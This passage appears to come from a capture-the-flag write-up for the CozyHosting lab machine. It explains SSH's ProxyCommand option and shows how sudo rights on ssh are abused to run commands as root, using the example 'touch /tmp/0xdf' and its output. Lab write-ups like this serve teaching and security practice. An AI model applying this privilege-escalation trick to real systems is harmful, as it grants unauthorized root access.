SSH has an option called ProxyCommand . I actually use this in real life to connect to SSH servers through a socks proxy. I have an SSH config file that looks like this: When I run ssh [hostname] , it runs nc connecting to localhost:1080 as a SOCKS5 ( -X 5 ) proxy, and then my SSH connection can travel over that proxy. The ProxyCommand is run on the client before making the connection, so I can abuse that to do arbitrary things as the user who is running the ssh command. In this case, that’s root because of sudo . I’ll show touching a file: josh@cozyhosting:~$ sudo ssh -o ProxyCommand = 'touch /tmp/0xdf' x kex_exchange_identification: Connection closed by remote host Connection closed by UNKNOWN port 65535 josh@cozyhosting:~$ ls -l /tmp/0xdf -rw-r--r-- 1 root root 0 Feb 27 18:19 /tmp/0xdf It works.
